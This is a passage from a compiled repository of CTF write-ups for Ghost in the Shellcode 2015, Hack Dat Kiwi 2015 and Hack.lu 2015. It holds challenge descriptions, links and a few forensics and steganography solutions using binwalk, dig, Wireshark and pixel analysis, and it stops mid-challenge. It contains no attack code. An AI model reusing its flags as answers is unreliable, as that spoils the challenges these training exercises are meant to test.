We see that not everything is legible, so we are running `binwalk -B decrypt | grep -v 'Zlib'`:

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    1015          0x3F7           gzip compressed data, from Unix, last modified: Thu Jan  1 20:23:53 2015

So there is gzip compressed data beginning at the 1015th byte. Let's extract it:

```
$ dd if=decrypt of=out.gz bs=1 skip=1015                                                                                 
15727025+0 records in
15727025+0 records out
15727025 bytes transferred in 22.621910 secs (695212 bytes/sec)
```

After that, just decompress the gzipped file with `mkdir out && tar xzvf out.gz -C out`.

We get a bunch of pictures (whose names are seen above), including the flag:

![Flag](U7DyCGI.jpg)

## Other write-ups and resources

* none yet
# Ghost in the Shellcode 2015: The Alpha Molecule

**Category:** Forensics
**Points:** 200
**Description:**

> Find the key! [File](https://2015.ghostintheshellcode.com/alpha_molecule-d2c7516d19609eaccbffc57b2ff0a9ae93d06b53b8140529ee2edb8a60e08520)

[Alternative download](https://mega.nz/#!ORFBhCJT!Vr7z9AojPBOslR7A7z8UuQLtK-C2XN5wQvdZQkJ9y1s)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups and resources:

* <http://hxp.io/blog/10/Ghost%20in%20the%20Shellcode%202015:%20Forensics%20200%20%22The%20Alpha%20Molecule%22/>
* <http://pastebin.com/ZM55bhRs>
* [Oscilloscoping](https://www.youtube.com/watch?v=XM8kYRS-cNk)

We are given a xz compressed tar archive that we decompress with `unxz` and extract its contents with `tar xvf alpha.tar` to get a wav, `Fuzyll - The Alpha Molecule.wav`.

The audio can be rendered with an oscilloscope as seen [in this example](https://www.youtube.com/watch?v=RkJdADVy_Mg).

We can do render the individual frames using [this python script](./oscilloscope.py) to receive several frames as PNGs:

```bash
$ python oscilloscope.py
$ ls -1 test*
test00000000.png
test00010000.png
test00020000.png
test00030000.png
[...]
test10620000.png
test10630000.png
test10640000.png
$ ls -1 test* | wc
    1065    1065   18105
```

We can convert these `1065` PNGs into a single GIF for an easier visualization using `ffmpeg -framerate 75 -i 'test%04d0000.png' alpha.gif`:

![](./alpha.gif)

Looking at the GIF, we notice letters passing by that spell out a sentence containing the flag, `ARE YOU HAVING OSCILLOFUN FUZYL`.

The flag is `FUZYL`.

## Other write-ups and resources

* <http://hxp.io/blog/10/Ghost%20in%20the%20Shellcode%202015:%20Forensics%20200%20%22The%20Alpha%20Molecule%22/>
* <http://pastebin.com/ZM55bhRs>
* [Oscilloscoping](https://www.youtube.com/watch?v=XM8kYRS-cNk)
# Ghost in the Shellcode 2015: Edgy

**Category:** Programming
**Points:** 300
**Description:**


> How well do you solve puzzles?
> Server: edgy.2015.ghostintheshellcode.com:44440 Password: EdgesAreFun

## Write-up

(TODO)

## Other write-ups and resources

* [Sourcecode](https://github.com/LightningTH/GiTS/blob/master/2015/Edgy)
* <http://pastebin.com/9zYJm4DC>
# Ghost in the Shellcode 2015: Boxxy

**Category:** Pwnable
**Points:** 300
**Description:**

> :)
> Server: boxxy.2015.ghostintheshellcode.com
> File: [File](boxxy-222b6023a5c6dd9921fc0a65d5fee00c693a477d942cf06ff3295856699f998c)

## Write-up

(TODO)

## Other write-ups and resources

* <http://idabook.com/ctf/boxxy_writeup.txt>
* <http://pastebin.com/0SNq6yvR#>
* <http://pastebin.com/j3vHGYA3>
* <http://pastebin.com/pfVxdg1z>
* <https://gist.github.com/kokjo/e2c61cdbe81e2c359d9a>
* <http://lokalhost.pl/x/boxy.py>
* <https://www.snip2code.com/Snippet/305065/Solution-of-boxxy-from-GITS2015>
# Ghost in the Shellcode 2015: Giggles

**Category:** Pwnable
**Points:** 300
**Description:**

> Find the key!
> Server: giggles.2015.ghostintheshellcode.com
> File: [File](giggles-30bd23b66e6b55d9672c415af2d716d075b196d03c9fed5a2a9d5966bda7cd93)

## Write-up

(TODO)

## Other write-ups and resources

* <http://kitctf.de/writeups/gits2015/giggles/>
* <http://idabook.com/ctf/giggles_writeup.txt>
* <https://blog.skullsecurity.org/2015/gits-2015-giggles-off-by-one-virtual-machine>
# Ghost in the Shellcode 2015: Gitschat

**Category:** Pwnable
**Points:** 500
**Description:**

> Find the key!
> Server: gitschat.2015.ghostintheshellcode.com
> File: [File](gitschat-783fbb5cb543ac723a77737fce8fa953ece18b13f12d8d9e55e62fbb524b2f9f)

## Write-up

(TODO)

## Other write-ups and resources

* <http://idabook.com/ctf/gitschat_writeup.txt>
* <https://rzhou.org/~ricky/gits2015/gitschat.py>
# Ghost in the Shellcode 2015: Blocky's Revenge

**Category:** Choose your Pwn Adventure
**Points:** 400
**Description:**

> Available in [Pwn Adventure 3](http://pwnadventure.com/)

## Write-up

(TODO)

## Other write-ups and resources

* <https://medium.com/@shanewilton/ghost-in-the-shellcode-2015-blockys-revenge-7074a119115e>
# Ghost in the Shellcode 2015: Egghunter

**Category:** Choose your Pwn Adventure 3
**Points:** 250
**Description:**

> Available in [Pwn Adventure 3](http://pwnadventure.com/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Ghost in the Shellcode 2015: Fire and Ice

**Category:** Choose your Pwn Adventure 3
**Points:** 300
**Description:**

> Available in [Pwn Adventure 3](http://pwnadventure.com/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Ghost in the Shellcode 2015: Overachiever

**Category:** Choose your Pwn Adventure 3
**Points:** 200
**Description:**

> Available in [Pwn Adventure 3](http://pwnadventure.com/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Ghost in the Shellcode 2015: Pirate's Treasure

**Category:** Choose your Pwn Adventure 3
**Points:** 500
**Description:**

> Available in [Pwn Adventure 3](http://pwnadventure.com/)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.0xebfe.net/blog/2015/01/24/ghost-in-the-shellcode-2015-pirates-treasure-500-write-up/> 
# Ghost in the Shellcode 2015: Unbearable Revenge

**Category:** Choose your Pwn Adventure 3
**Points:** 200
**Description:**

> Available in [Pwn Adventure 3](http://pwnadventure.com/)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Ghost in the Shellcode 2015: Until the Cows Come Home

**Category:** Choose your Pwn Adventure 3
**Points:** 100
**Description:**

> Available in [Pwn Adventure 3](http://pwnadventure.com/)

## Write-up

(TODO)

## Other write-ups and resources

* <http://lockboxx.blogspot.com/2015/01/ghost-in-shellcode-2015-ctf-writeup-pwn.html>
# Ghost in the Shellcode CTF 2015 write-ups

* <https://2015.ghostintheshellcode.com/>
* [Scoreboard](https://gist.github.com/suspendrs/2c07fbf8e82ebcfe0e8f)
* [Tasks ordered by solves](https://gist.github.com/suspendrs/2c7272c941799e06ed12)
* [Hacks for PwnAdventure3](https://github.com/zku/PwnAdventure3Hacks)

## Completed write-ups

* [crypto/knockers](crypto/knockers)
* [crypto/nikoli](crypto/nikoli)
* [forensics/cloudfs](forensics/cloudfs)
* [forensics/rubicon](forensics/rubicon)
* [forensics/the_alpha_molecule](forensics/the_alpha_molecule)
* [trivia/biggest](trivia/biggest)

## External write-ups only

* [crypto/mtgo](crypto/mtgo)
* [crypto/vig128](crypto/vig128)
* [forensics/portal2](forensics/portal2)
* [programming/edgy](programming/edgy)
* [pwn_adventure/blockys_revenge](pwn_adventure/blockys_revenge)
* [pwn_adventure/pirates_treasure](pwn_adventure/pirates_treasure)
* [pwn_adventure/until_the_cows_come_home](pwn_adventure/until_the_cows_come_home)
* [pwnable/boxxy](pwnable/boxxy)
* [pwnable/giggles](pwnable/giggles)
* [pwnable/gitschat](pwnable/gitschat)
* [reverse/huffy](reverse/huffy)
* [web/aart](web/aart)

## Missing write-ups

* [pwn_adventure/egg_hunter](pwn_adventure/egg_hunter)
* [pwn_adventure/fire_and_ice](pwn_adventure/fire_and_ice)
* [pwn_adventure/overachiever](pwn_adventure/overachiever)
* [pwn_adventure/unbearable_revenge](pwn_adventure/unbearable_revenge)# Ghost in the Shellcode 2015: Huffy

**Category:** Reversing
**Points:** 300
**Description:**

> Find the key!
> File: [File](huffy-226ecfaeb073543ba8fa8cec0c948244e68498c301f000909789be589e060f49)
> Server: huffy.2015.ghostintheshellcode.com:8143

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/kitctf/writeups/tree/master/gits2015/huffy>
* <https://blog.skullsecurity.org/2015/gits-2015-huffy-huffman-encoded-shellcode>
# Ghost in the Shellcode 2015: Biggest

**Category:** Trivia
**Points:** 1
**Description:**

> What is the biggest name in CTF? (strlen)

## Write-up

The task was to find the CTF with the longest name.

The answer was `Ghost in the Shellcode`.

## Other write-ups and resources

* none yet
# Ghost in the Shellcode 2015: Aart

**Category:** Web
**Points:** 200
**Description:**

> Find the key!
> Server: http://aart.2015.ghostintheshellcode.com

## Write-up

(TODO)

## Other write-ups and resources

* <http://kitctf.de/writeups/gits2015/aart/>
* <http://misterch0c.ghost.io/gits-aart/>
* <http://0x1337seichi.wordpress.com/2015/01/18/ghost-in-the-shellcode-2015-web-200-aart-writeup/>
* <http://pastebin.com/nXszqW0M>
* <https://blog.skullsecurity.org/2015/gits-2015-aart-php-race-condition>
# Hack Dat Kiwi CTF 2015: Vigenere 1

**Category:** Crypto
**Points:** 50
**Solves:** 254
**Description:**

> Contrary to popular belief, in Cryptography, breaking a cipher is not the process of finding plaintext relating to a ciphertext.
> 
> Breaking a cipher (Cryptanalysis) is the process of finding the Key used to encrypt a data.
> 
> Once a Key is found, many instances of data can be decrypted. That's why in modern ciphers, even if you know the plaintext (or even select it), you should not be able to find the Key.
> 
> Vigenere is a classic cryptographic cipher. It is very simple, yet not that easy to break. Unless you break Vigenere on your own, you can't call yourself a cryptanalyst. Start with the simplest mode, Chosen Plaintext Attack: [sample.txt](./sample.txt)


## Write-up

(TODO)

## Other write-ups and resources

* <https://pequalsnp-team.github.io/writeups/vigenere1/>
* <http://cafelinux.info/articles/writeups-hack-dat-kiwi-vigenere-1-50>
* <http://justpentest.blogspot.in/2015/11/CTF-hack-dat-kiwi-writeups.html>
* <http://hack.dat.kiwi/writeup#Vigenre_1>
# Hack Dat Kiwi CTF 2015: Vigenere 2

**Category:** Crypto
**Points:** 80
**Solves:** 245
**Description:**

> So you got crypto skills, right? Try it again on Known Plaintext Mode:


## Write-up

(TODO)

## Other write-ups and resources

* <https://pequalsnp-team.github.io/writeups/vigenere1/>
* <http://hack.dat.kiwi/writeup#Vigenre_2>
* [French](https://ascopectf.wordpress.com/2015/11/21/writeup-crypto-vigenere-100/)
# Hack Dat Kiwi CTF 2015: Vigenere 3

**Category:** Crypto
**Points:** 120
**Solves:** 206
**Description:**

> Well those two were child's play. I just wanted to see if you know any crypto at all or not. The real deal starts here, Ciphertext-only Attack:


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Vigenre_3>
# Hack Dat Kiwi CTF 2015: Vigenere 4

**Category:** Crypto
**Points:** 220
**Solves:** 14
**Description:**

> I'm starting to like you! Break this one and you earn the right to brag!


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Vigenre_4>
# Hack Dat Kiwi CTF 2015: hti

**Category:** Experimental
**Points:** 250
**Solves:** 27
**Description:**

> You know what? I hate those companies that create cheap, insecure, crappy software, and then pay large sums of cash to buy
> 
> 	security software like WAFs to protect that crap. Why don't you spend the money initially to fix the code?
> 
> 
> The security software employed by this company has 3 modes of operation, some modes are slower and more secure, and some are faster and less secure.
> 
> Hack them to show this is not how you protect code.


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#HTI>
# Hack Dat Kiwi CTF 2015: nti

**Category:** Experimental
**Points:** 150
**Solves:** 31
**Description:**

> You know what? I hate those companies that create cheap, insecure, crappy software, and then pay large sums of cash to buy security software like WAFs to protect that crap. Why don't you spend the money initially to fix the code?
> 
> 
> The security software employed by this company has 3 modes of operation, some modes are slower and more secure, and some are faster and less secure.
> 
> Hack them to show this is not how you protect code.


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#NTI>
# Hack Dat Kiwi CTF 2015: pti

**Category:** Experimental
**Points:** 200
**Solves:** 32
**Description:**

> You know what? I hate those companies that create cheap, insecure, crappy software, and then pay large sums of cash to buy security software like WAFs to protect that crap. Why don't you spend the money initially to fix the code?
> 
> 
> The security software employed by this company has 3 modes of operation, some modes are slower and more secure, and some are faster and less secure.
> 
> Hack them to show this is not how you protect code.


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#PTI>
# Hack Dat Kiwi CTF 2015: Leet Maze

**Category:** Forensics
**Points:** 250
**Solves:** 39
**Description:**

> We found a malware that communicates with track.dat.kiwi, however, there's nothing on track.dat.kiwi! It appears that they have established a complicated network of DNS records to point to the C&amp;C server.
> 
> 
> It's basically like CNAME, the software follows track.dat.kiwi to find out the target server. However, there are some caveats.
> 
> 
> <strong>Hint:</strong> To send a DNS request to a particular server for a particular record type, you can use the tool <strong>dig</strong> that comes with BIND like this:
> 
> 
> `dig @server track.dat.kiwi TXT`


## Write-up

by [polym](https://github.com/abpolym)

We are given a domain name `track.dat.kiwi`, which DNS TXT record we have to read, according to the description.

This can be done using `dig` as the description suggests or `python` with the `dns` module.

The former can be done as the description suggests and the latter like [this writeup suggests](http://edholabs.ga/ctf_writeups/Leet_Maze.txt).

Each TXT record then gives you another domain name, which you have to query for its TXT record again - rinse and repeat.

In the end, all TXT records form some sort of maze of domain names.

Some domain names look like leet speak, such as `G|2IP5/-C]{.dat.kiwi` and you have to "de-leet" it before querying its TXT record.

Finally, the flag (`8410393`) is hidden in one of these TXT records:

    FLAG:"The key is: 8410393"

## Other write-ups and resources

* <http://edholabs.ga/ctf_writeups/Leet_Maze.txt>
* <http://hack.dat.kiwi/writeup#Leet_Maze>
* <https://github.com/tothi/ctfs/tree/master/hack-dat-kiwi-ctf-2015/forensics/leet-maze>
# Hack Dat Kiwi CTF 2015: SSL Sniff

**Category:** Forensics
**Points:** 50
**Solves:** 210
**Description:**

> We received a network capture file of an HTTPS request that was MITMd. Try to find the culprit.
> 
> Download [dump.pcap](./dump.pcap)


## Write-up

by [polym](https://github.com/abpolym)

We are given a tcpdump capture that contains an SSL encrypted conversation.

Fortunately, the key is hidden inside the certificate's stateOrProvinceName field:

![](./wireshark.png)

The flag is `flag{Key-Is-dUs1mKl4}`.

PS: According to [this writeup](http://justpentest.blogspot.in/2015/11/CTF-hack-dat-kiwi-writeups.html), we can also grep the tcp stream using `tcpdump -qns 0 -A -r dump.pcap | grep <string>`!

## Other write-ups and resources

* <http://justpentest.blogspot.in/2015/11/CTF-hack-dat-kiwi-writeups.html>
* <https://ctftime.org/writeup/2144>
* <http://hack.dat.kiwi/writeup#SSL_Sniff>
# Hack Dat Kiwi CTF 2015: SSL Sniff 2

**Category:** Forensics
**Points:** 120
**Solves:** 77
**Description:**

> We received a network capture file of an HTTPS request that was MITMd. This time we know that the actual request had useful information, and thanks to
> 
> you we now have the culprit's private key [server.key.insecure](./server.key.insecure). Find the useful information.
> 
> [Download](./client.pcap)


## Write-up

by [polym](https://github.com/abpolym)

We are given a tcpdump of SSL encrypted data and a RSA key that should decrypt this conversation.

This is easily done using `wireshark`: `Preferences -> Protocols -> SSL -> Edit RSA keys list`, then input all required information (e.g. key file location, IP etc):

![](./wireshark-sslkey.png)

Afterwards, we can just see the decrypted SSL conversation using `Analyze -> Follow -> SSL Stream`:

![](./wireshark-sslfollow.png)

The flag is `39u7v25n1jxkl123`.

## Other write-ups and resources

* <http://justpentest.blogspot.in/2015/11/CTF-hack-dat-kiwi-writeups.html>
* <https://ctftime.org/writeup/2143>
* <http://cafelinux.info/articles/writeups-hack-dat-kiwi-ssl-sniff-1-50>
* <http://edholabs.ga/ctf_writeups/dump.png>
* <http://hack.dat.kiwi/writeup#SSL_Sniff_2>
# Hack Dat Kiwi CTF 2015 write-ups

* <http://hack.dat.kiwi/>
* [Scoreboard](http://hack.dat.kiwi/scoreboard) or [local alternative](./scoreboard)
* [Sources for all challenges and descriptions to test on your own](http://hack.dat.kiwi/static/installer-public.zip) -- For this CTF, please use this installer instead of relying on the completeness of the CTF in this repo. Local alternative: [installer-public.zip](./installer-public.zip)
* Total number of players: 401
* Write-ups by the challenge authors: [click](http://hack.dat.kiwi/writeup)

## Completed write-ups

* [forensics/leet-maze](forensics/leet-maze)
* [forensics/ssl-sniff](forensics/ssl-sniff)
* [forensics/ssl-sniff-2](forensics/ssl-sniff-2)
* [stegano/simple-stegano](stegano/simple-stegano)

## External write-ups only

* [crypto/vigenere-1](crypto/vigenere-1)
* [crypto/vigenere-2](crypto/vigenere-2)
* [crypto/vigenere-3](crypto/vigenere-3)
* [crypto/vigenere-4](crypto/vigenere-4)
* [experimental/hti](experimental/hti)
* [experimental/nti](experimental/nti)
* [experimental/pti](experimental/pti)
* [reversing/blue-freeze](reversing/blue-freeze)
* [reversing/gaychal](reversing/gaychal)
* [reversing/ugly-bin](reversing/ugly-bin)
* [reversing/virtual-virtue](reversing/virtual-virtue)
* [web/captcha-password](web/captcha-password)
* [web/kiwi-forum](web/kiwi-forum)
* [web/kiwi-forum-2](web/kiwi-forum-2)
* [web/math-quiz](web/math-quiz)
* [web/phone-lock](web/phone-lock)
* [web/phone-lock-2](web/phone-lock-2)

## Missing write-ups# Hack Dat Kiwi CTF 2015: Blue Freeze

**Category:** Reversing
**Points:** 250
**Solves:** 16
**Description:**

> There's a service running that can freeze! Exploit it and find the flag. It runs on port 1337, just netcat it.
> 
> The service runs under jailed environment with access to only sh, ls and cat binaries. The linked libraries are standards of this system.
> 
> [Download](./handout)


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Blue_Freeze>
# Hack Dat Kiwi CTF 2015: Gaychal

**Category:** Reversing
**Points:** 80
**Solves:** 130
**Description:**

> I found some suspicious PHP code on my website. The code was attached to my theme's footer file.
> 
> It's either the DRM of the theme, or a virus; however it's encoded and I can't figure it out. Do that for me please :)
> 
> [Download](./gaychal.txt)


## Write-up

(TODO)

## Other write-ups and resources

* <http://cafelinux.info/articles/writeups-hack-dat-kiwi-gaychal-80>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2015/hack.dat.kiwi/gaychal>
* <https://github.com/JonathanSinger/ctf-solutions/blob/master/hack-dat-kiwi_gaychal.sh>
* <http://hack.dat.kiwi/writeup#Gaychal>
# Hack Dat Kiwi CTF 2015: Ugly Bin

**Category:** Reversing
**Points:** 180
**Solves:** 24
**Description:**

> Ukh! That's one ugly binary. Why do people code like that? I guess if you give it the proper password, it generates the flag.
> 
> [Download](./ugly-bin)


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Ugly_Bin>
# Hack Dat Kiwi CTF 2015: Virtual Virtue

**Category:** Reversing
**Points:** 150
**Solves:** 17
**Description:**

> This virtually needs but actually boggles your mind. Find the proper sequence of inputs and maximize your score to win!
> 
> [Download](./virtual-no-rtti)


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Virtual_Virtue>
# Hack Dat Kiwi CTF 2015: Simple Stegano

**Category:** Stegano
**Points:** 250
**Solves:** 31
**Description:**

> Just a basic stegano software. Find the message hidden in the original image, and you're good to go. You can hide any message you want in the image too!
> 
> [the-troll.png](./the-troll.png)


## Write-up

by [polym](https://github.com/abpolym)

We are given a PNG and a website that encodes a given string into the same troll picture.

Using [pixels.py](./pixels.py), we determine differences in the pixel values between pictures.

We choose pictures that contain the strings`password1` ([password1.png](./password1.png)) and `qassword0` ([qassword0.png](./qassword0.png)), because they differ at two bits in the string representations.

Using bash's built-in [process substitution](https://en.wikipedia.org/wiki/Process_substitution), we can run a diff between the pixels values between both pictures (`p2` is my alias for python2.7):

```bash
+bash4.3$ diff <(p2 pixels.py password1.png) <(p2 pixels.py qassword0.png)
65286c65286
< 255
---
> 254
66673c66673
< 142
---
> 143
```

Lets have a look at the output. This output means that one pixel value is set to `255` in `password1.png` and `254` in `qassword0.png`.
The first letter in `password1` (`p`) is represented in binary as `01110001`, the first letter in `qassword0` (`q`) is `01110000`.

Do you see the correlation between pixel value and binary representation?
It looks like the binary representation of our message is encoded in the pixel values (`!=0`) by either adding a 1 to the pixel value (`255=254+1`) to the base value of the original picture or not (`254`).

All we have to do is get the [base values](./basenumbers) of the original pictures and subtract the pixel values from the values of our given picture, [the-troll.png](the-troll.png).

The python script [getbinary.py](./getbinary.py) does the job:

```bash
+bash4.3$ p2 getbinary.py the-troll.png | perl -lpe '$_=pack"B*",$_'
In cryptography, a key is a piece of information (a parameter) that determines the functional [...]
[...]
+bash4.3$ p2 getbinary.py the-troll.png | perl -lpe '$_=pack"B*",$_' | grep -Eoi 'the key is .*'
the key is tSJ9F4KY04VLXt7mw3mQhu1LBoE. For the production of small amounts of keying material, ordinary dice provide a good source of high quality randomness.
```

The flag is `tSJ9F4KY04VLXt7mw3mQhu1LBoE`.

Alternative Solution script: [Solution](./stegano.py)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Simple_Stegano>
# Hack Dat Kiwi CTF 2015: Captcha Password

**Category:** Web
**Points:** 300
**Solves:** 10
**Description:**

> Have you ever hacked those big systems where you have to exploit several things, escalate priviledges multiple times, and find nasty new vulnerabilities
> 
> in custom software? Of course you have! Basically do the same thing here.


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Captcha_Password>
# Hack Dat Kiwi CTF 2015: Kiwi Forum 1

**Category:** Web
**Points:** 120
**Solves:** 78
**Description:**

> A full fledged Kiwi software! And a forum at that. It's also [kiwi-source.zip](./kiwi-source.zip) open source.
> 
> The admins on this forum are so proud of their product, they have put their flag keys on their avatar photos!


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Kiwi_Forum>
# Hack Dat Kiwi CTF 2015: Kiwi Forum 2

**Category:** Web
**Points:** 250
**Solves:** 34
**Description:**

> That was a nasty bug!  But not anymore. Try it this time.


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Kiwi_Forum_2>
# Hack Dat Kiwi CTF 2015: Math Quiz

**Category:** Web
**Points:** 150
**Solves:** 95
**Description:**

> So I got this douchy classmate that thinks he's super cool. He created a math quiz software for our class in 10 minutes, and claims its super secure with protections and everything. We all hate him, and if you hack his code, we're gonna love you! By the way, he told a friend of mine that he keeps his secrets among the quiz questions, but those questions are never used in the software.


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.i4info.in/2015/11/21/hackdat-mathquiz/>
* <http://hack.dat.kiwi/writeup#Math_Quiz>
# Hack Dat Kiwi CTF 2015: Phone Lock 1

**Category:** Web
**Points:** 50
**Solves:** 270
**Description:**

> A friend of mine forgot her phone password. I told her you're the hacker! Go get 'em tiger.


## Write-up

(TODO)

## Other write-ups and resources

* <http://cafelinux.info/articles/writeups-hack-dat-kiwi-phone-lock-1-50>
* <http://edholabs.ga/ctf_writeups/md5_crack_js.txt>
* <http://justpentest.blogspot.in/2015/11/CTF-hack-dat-kiwi-writeups.html>
* <http://www.i4info.in/2015/11/21/hackdat-mathquiz/>
* <http://hack.dat.kiwi/writeup#Phone_Lock_1>
* [French](https://ascopectf.wordpress.com/2015/11/22/write-upweb50phone-lock-1/)
# Hack Dat Kiwi CTF 2015: Phone Lock 2

**Category:** Web
**Points:** 100
**Solves:** 26
**Description:**

> Remember my friend you fixed her phone? She told everybody about it. One of her friends has a crappy phone, and he's pretty sure he knows what the password is, but the password doesn't work. Since you're a hacker and all, he wants you to figure out whats wrong!


## Write-up

(TODO)

## Other write-ups and resources

* <http://hack.dat.kiwi/writeup#Phone_Lock_2>
# Hack.lu CTF 2015: GuessTheNumber

**Category:** Coding
**Points:** 150
**Solves:** 52
**Description:**

> The teacher of your programming class gave you a tiny little task: just write a guess-my-number script that beats his script. He also gave you some hard facts:
> 
>> he uses some LCG with standard glibc LCG parameters
>> the LCG is seeded with server time using number format YmdHMS (python strftime syntax)
>> numbers are from 0 up to (including) 99
>> numbers should be sent as ascii string
> 
> You can find the service on school.fluxfingers.net:1523


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/GuessTheNumber%20%5Bppc%5D%20(150)>
* <https://github.com/ByteBandits/writeups/blob/master/hack.lu-ctf-2015/coding/GuessTheNumber/sudhackar/README.md>
# Hack.lu CTF 2015: Perl Golf

**Category:** Coding
**Points:** 75
**Solves:** 132
**Description:**

> Johnny B. Krad from your local schoolyard gang thinks that you are a poser! The stuff you solved until now was just luck. He bets that you are not able to beat him in Perl golf.
> [Link](https://school.fluxfingers.net:1521/golf/perl/)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Perl%20Golf%20%5Bppc%5D%20(75)>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131675675589/hacklu-ctf-2015-writeup)
# Hack.lu CTF 2015: PHP Golf

**Category:** Coding
**Points:** 75
**Solves:** 68
**Description:**

> Johnny B. Krad from your local schoolyard gang still thinks that you are a poser! Even if you could beat him in Perl golf, you probably can't in PHP golf... 
> [Link](https://school.fluxfingers.net:1521/golf/php/)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/PHP%20Golf%20%5Bppc%5D%20(75)>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131675675589/hacklu-ctf-2015-writeup)
# Hack.lu CTF 2015: Speedrun

**Category:** Coding
**Points:** 350
**Solves:** 15
**Description:**

> This goddamn budget cuts. Everyone knows that the computer science class is the most important class today. But as soon as the school does not get enough budget from the state, they shorten down the computer science class. And others like history class are not affected by the budget cut. Like this stuff is important today ... it's history, right?
> 
> Now you only have a one hour computer science class instead of a two hours class. This is an outrage. Everyone knows that you need a two hours class to walk through your game completely. You can already hear them say "Oh look, now he can not finish his game. What a douche!". But you will show them. You only need to optimize the decisions you have to make in your turn. And then you will beat this game in time!
> 
> Client: [Link](speedrun_87eee91811c1451d0aebc9a31f82c38d.py)
> Server: school.fluxfingers.net
> Port: 1511


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hack.lu CTF 2015: Campus ID SSO

**Category:** Crypto
**Points:** 200
**Solves:** 9
**Description:**

> You really wanted to join the beekeeping course this semester, but it's very hard to get in.
> Turns out, [this recent password dump](passwd_7f82ff8b40ef028998c8e1cbfc1f2cb3) comes in handy, as you find out the teacher's password is in there.
> So why not break into his [Campus ID Single-Sign On](https://school.fluxfingers.net:1510/login) account and assign yourself a guaranteed slot?


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hack.lu CTF 2015: Checkcheckcheck

**Category:** Crypto
**Points:** 150
**Solves:** 42
**Description:**

> We seem to have a small security problem with our new flag storage service. We already added a password login to it, with a fancy hash function, but somehow, these hackers still manage to log in. Something seems to be broken...
> 
> connect to school.fluxfingers.net:1513
> [download](checkcheckcheck_c5a866531f9b1969ffe90656c93fbb24.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/2067>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131675675589/hacklu-ctf-2015-writeup)
# Hack.lu CTF 2015: Creative Cheating

**Category:** Crypto
**Points:** 150
**Solves:** 111
**Description:**

> Mr. Miller suspects that some of his students are cheating in an automated computer test. He [captured some traffic](dump_2bd6da8de87c6f1170dec710f7268a16.pcapng) between crypto nerds Alice and Bob. It looks mostly like garbage but maybe you can figure something out.
> He knows that Alice's RSA key is (n, e) = (0x53a121a11e36d7a84dde3f5d73cf, 0x10001) (192.168.0.13) and Bob's is (n, e) = (0x99122e61dc7bede74711185598c7, 0x10001) (192.168.0.37)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Creative%20Cheating%20%5Bcrypto%5D%20(150)>
* <https://github.com/ByteBandits/writeups/blob/master/hack.lu-ctf-2015/crypto/Creative%20Cheating/sudhackar/README.md>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131675675589/hacklu-ctf-2015-writeup)
# Hack.lu CTF 2015: Formular Generator

**Category:** Crypto
**Points:** 150
**Solves:** 33
**Description:**

> It's grading time again. But the students didn't do that well this time. The teachers hand in the grades with a formular which has a random id and is signed by 5 numbers. One student managed to get parts of the source code of the program which is used to generate and sign these formulars. Can you fake a create a formular to hand in your grades on your own ?
> 
> [Source](formulargenerator_81156ee54ab6040cfd6cb16860e18d59.tar.gz)
> Service listens at school.fluxfingers.net:1525


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://shiho-elliptic.tumblr.com/post/131675675589/hacklu-ctf-2015-writeup)
# Hack.lu CTF 2015: Salt

**Category:** Crypto
**Points:** 200
**Solves:** 20
**Description:**

> We managed to capture the following traffic from a user who retrieved a note from that new secure notebook service:
> 
> request: b'\xa0f?u\xfb;AZf\xfc@{M!\xcdP\x92\xf6\x0f\xea\x1d\xad@\xc5\x8c\xd0R\xd8\xfdX81\x01d\xc8\x9b\xc4\xfd\x04\x9b\x843a\x940U\xc4\x7fa\x11W\xa9uf\xa9\xf4%w;`s[\xad\xa8V\x90\xe0w,\xb6<\xbd\xb1\xcbh=\x0b\x80\xba\xd8\x9bM\x17\xc6\x1f\x83<G\xcfV\x93\x00E\xe97\xcc\x9a.\xa1\xe6\x13\x11\xe9<\xae'
> 
